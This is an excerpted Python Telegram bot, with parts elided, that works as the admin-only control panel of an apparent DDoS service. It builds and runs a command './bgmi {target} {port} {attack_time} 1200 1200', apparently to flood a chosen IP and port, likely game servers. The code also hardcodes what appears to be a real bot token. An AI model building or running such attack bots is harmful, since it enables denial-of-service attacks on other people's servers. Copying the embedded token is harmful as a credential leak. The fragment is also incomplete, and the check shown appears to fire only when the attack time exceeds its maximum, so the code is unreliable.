...
bot = telebot.TeleBot('8138631810:AAEPzkYYIKq9RQc2dytA2MOaiUuKMzMibn4')
...
def bot_sitting(message):
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        bot.reply_to(message, "⛔ Apne kam se kam rakh bro : Admins only.")
        return
...
def admin_panel(message):
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        bot.reply_to(message, "⛔ Apna ghar samjh liya kya kahi bhi ghusa ja rha: Admins only.")
        return
    ...
    if len(details) == 3:
        ...
        try:
            ...
            if attack_time > MAX_ATTACK_TIME:
                ...
                full_command = f"./bgmi {target} {port} {attack_time} 1200 1200"  # ✅ Correct variable name
                ...
                response = (
                    ...
                    f"𝗔𝘁𝘁𝗮𝗰𝗸𝗲𝗿: SBR KR BRO ALL READY ATTACK CHAL RHA HAI"
                )
